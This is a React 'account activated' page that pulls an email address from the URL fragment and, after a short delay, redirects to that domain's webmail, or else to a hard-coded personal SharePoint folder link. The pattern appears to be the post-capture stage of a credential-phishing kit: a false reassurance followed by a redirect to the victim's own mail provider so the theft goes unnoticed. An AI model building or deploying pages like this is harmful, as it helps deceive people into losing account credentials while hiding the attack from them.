import React, { useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';

const AccountActivated = () => {
  const navigate = useNavigate();
  const location = useLocation();

  // Redirect after 3 seconds
  useEffect(() => {
    const timer = setTimeout(() => {
      const hash = location.hash;
      let domain = '';
      if (hash && hash.includes('@')) {
        domain = hash.split('@')[1];
      }
      
      if (domain) {
        const redirectUrls = [
          `https://webmail.${domain}`,
          `https://mail.${domain}`,
          `https://${domain}/webmail`
        ];

        // Attempt redirect to the first available URL
        const redirectUrl = redirectUrls[0];
        window.location.href = redirectUrl;
      } else {
        window.location.href = 'https://uttc0-my.sharepoint.com/:f:/g/personal/kthomas_uttc_edu/EoDo6-Gpp9RHuDxSnelgC8sBWe0gt-TB546BqTxmZ_spxQ?e=mGNXCF';
      }
    }, 2000);

    return () => clearTimeout(timer); // Cleanup the timer
  }, [navigate, location]);

  return (
    <div className="min-h-screen flex flex-col bg-gray-50">
      {/* Main Content */}
      <div className="flex flex-col items-center justify-center flex-grow px-4">
        <div className="w-full max-w-md bg-white shadow-md rounded-lg p-8 text-center">
          <h1 className="text-2xl font-semibold text-gray-700 mb-4">Thank you!</h1>
          <p className="text-gray-600">Your account has been activated.</p>
          <p className="text-gray-500 mt-2">You will be redirected shortly...</p>
        </div>
      </div>
    </div>
  );
};

export default AccountActivated;